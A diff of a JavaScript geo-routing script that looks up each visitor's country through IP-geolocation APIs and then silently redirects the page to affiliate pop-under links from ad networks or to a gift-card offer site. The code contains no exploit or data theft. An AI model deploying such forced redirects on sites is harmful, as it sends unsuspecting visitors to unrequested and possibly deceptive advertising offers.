@@ -1,21 +1,31 @@
-// Geo Router v1 — with Debug Mode (?debug=1)
-// PH/NL/US rules + worldwide fallback
-
+// Geo Router v2 — fast providers + timeout + debug
 (function () {
   const qs = new URLSearchParams(location.search);
   const DEBUG = qs.get("debug") === "1";
 
   const LINKS = {
-    PH: "https://otieu.com/4/4203960", // Monetag PH
-    NL: "https://t.avlmy.com/393289/7910?popUnder=true&aff_sub5=NL", // Adsterra NL
-    US: "https://t.avlmy.com/393289/7910?popUnder=true&aff_sub5=US", // Adsterra US
-    BR: "https://otieu.com/4/4203960", // Monetag BR (sample)
-    XX: "https://giftcardzoneeu.com/NeutralCPC/" // Fallback
+    PH: "https://otieu.com/4/4203960",
+    NL: "https://t.avlmy.com/393289/7910?popUnder=true&aff_sub5=NL",
+    US: "https://t.avlmy.com/393289/7910?popUnder=true&aff_sub5=US",
+    BR: "https://otieu.com/4/4203960",
+    XX: "https://giftcardzoneeu.com/NeutralCPC/"
   };
 
-  const redirect = (country, source, raw) => {
-    const cc = (country || "XX").toUpperCase();
-    const target = LINKS[cc] || LINKS.XX;
+  const fetchWithTimeout = (url, ms=1500) =>
+    Promise.race([
+      fetch(url, { cache: "no-store" }),
+      new Promise((_, r) => setTimeout(() => r(new Error("timeout")), ms))
+    ]);
+
+  const providers = [
+    { name: "country.is", url: "https://api.country.is", pick: j => j && j.country },
+    { name: "ipapi.co",   url: "https://ipapi.co/json/", pick: j => j && j.country },
+    { name: "ipwho.is",   url: "https://ipwho.is/",      pick: j => j && j.country_code }
+  ];
+
+  const redirect = (cc, source, raw) => {
+    const C = (cc || "XX").toUpperCase();
+    const target = LINKS[C] || LINKS.XX;
 
     if (DEBUG) {
       document.body.innerHTML = `
@@ -24,12 +34,12 @@
             <h2 style="margin:0 0 8px">🧭 Geo Debug</h2>
             <p style="margin:0 0 16px;color:#9bb0ff">Preview only — no auto redirect.</p>
             <div style="line-height:1.8">
-              <div><b>Detected Country:</b> ${cc}</div>
+              <div><b>Detected Country:</b> ${C}</div>
               <div><b>Source:</b> ${source}</div>
               <div><b>Target URL:</b> <code style="word-break:break-all">${target}</code></div>
             </div>
-            <details style="margin-top:12px"><summary style="cursor:pointer">Raw response</summary>
-              <pre style="white-space:pre-wrap;font-size:12px">${raw ? JSON.stringify(raw, null, 2) : "(none)"}</pre>
+            <details style="margin-top:12px"><summary>Raw</summary>
+              <pre style="white-space:pre-wrap;font-size:12px">${raw ? JSON.stringify(raw,null,2) : "(none)"}</pre>
             </details>
             <div style="margin-top:16px;display:flex;gap:8px;flex-wrap:wrap">
               <a href="${target}" style="padding:10px 14px;background:#22c55e;color:#08120a;border-radius:10px;text-decoration:none">Continue to Offer →</a>
@@ -39,33 +49,19 @@
         </div>`;
       return;
     }
-
-    // normal mode
     location.replace(target);
   };
 
-  const fetchCountry = async () => {
-    try {
-      const r1 = await fetch("https://ipapi.co/json/");
-      if (r1.ok) {
-        const j1 = await r1.json();
-        if (j1 && j1.country) return { cc: j1.country, raw: j1, src: "ipapi.co" };
-      }
-    } catch (e) {}
-
-    try {
-      const r2 = await fetch("https://ipwho.is/");
-      if (r2.ok) {
-        const j2 = await r2.json();
-        if (j2 && j2.country_code) return { cc: j2.country_code, raw: j2, src: "ipwho.is" };
-      }
-    } catch (e) {}
-
-    return { cc: "XX", raw: null, src: "fallback" };
-  };
-
   (async () => {
-    const { cc, raw, src } = await fetchCountry();
-    redirect(cc, src, raw);
+    for (const p of providers) {
+      try {
+        const r = await fetchWithTimeout(p.url, 1600);
+        if (!r || !r.ok) continue;
+        const j = await r.json();
+        const cc = p.pick(j);
+        if (cc) return redirect(cc, p.name, j);
+      } catch (_) {}
+    }
+    redirect("XX", "fallback", null);
   })();
 })();
